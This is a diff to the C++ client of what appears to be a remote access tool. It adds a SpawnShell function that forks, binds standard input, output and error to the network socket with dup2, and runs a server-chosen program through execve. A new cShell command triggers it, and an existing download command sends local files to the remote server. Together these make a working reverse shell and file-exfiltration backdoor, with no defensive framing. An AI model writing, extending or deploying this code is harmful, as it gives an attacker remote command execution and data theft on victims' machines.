@@ -2,6 +2,55 @@
 #include "Commands.hpp"
 #include "Misc.hpp"
 
+void Client::SpawnShell(const std::string strCommand){
+	#ifdef _DEBUG
+	std::cout<<"Spawn "<<strCommand<<'\n';
+	#endif
+	pid_t pP = fork();
+	if(pP == 0){ //child running
+		if(ssSendBinary(CommandCodes::cShellRunning) <= 0){
+			#ifdef _DEBUG
+			std::cout<<"Unable to send command to server\n";
+			error();
+			#endif
+			exit(0);
+		}
+		#ifdef _DEBUG
+		std::cout<<"Shell running\n";
+		#endif
+		dup2(sckSocket, 0);
+		dup2(sckSocket, 1);
+		dup2(sckSocket, 2);
+		char *argv[] = {nullptr};
+		char *env[] = {nullptr};
+		execve(strCommand.c_str(), argv, env);
+		exit(0);
+	} else if(pP > 0) { //parent
+		wait(nullptr);
+		#ifdef _DEBUG
+		std::cout<<"Shell ends\n";
+		#endif
+		if(send(sckSocket, CommandCodes::cShellEnd, 3, 0) <= 0){
+		//if(ssSendBinary(CommandCodes::cShellEnd) <= 0){
+			#ifdef _DEBUG
+			std::cout<<"Unable to send command to server\n";
+			error();
+			#endif
+		}
+	} else {
+		#ifdef _DEBUG
+		std::cout<<"fork failed\n";
+		error();
+		#endif
+		if(ssSendBinary(CommandCodes::cShellError) <= 0){
+			#ifdef _DEBUG
+			std::cout<<"Unable to send command to server\n";
+			error();
+			#endif
+		}
+	}
+}
+
 bool Client::SendFile(const std::string strLocalFile) {
 	#ifdef _DEBUG
 	std::cout<<"Sending "<<strLocalFile<<'\n';
@@ -152,6 +201,7 @@ bool Client::ParseCommand(char*& strCommand){
 				#endif
 				return false;         //return false to close connection
 			}
+			goto release;
 		}
 		if(vcCommands[0] == CommandCodes::cDownload){
 			if(SendFile(vcCommands[1])){
@@ -159,6 +209,10 @@ bool Client::ParseCommand(char*& strCommand){
 				std::cout<<"Send success\n";
 				#endif
 			}
+			goto release;
+		}
+		if(vcCommands[0] == CommandCodes::cShell){
+			SpawnShell(vcCommands[1]);
 			goto release;
 		}
 		
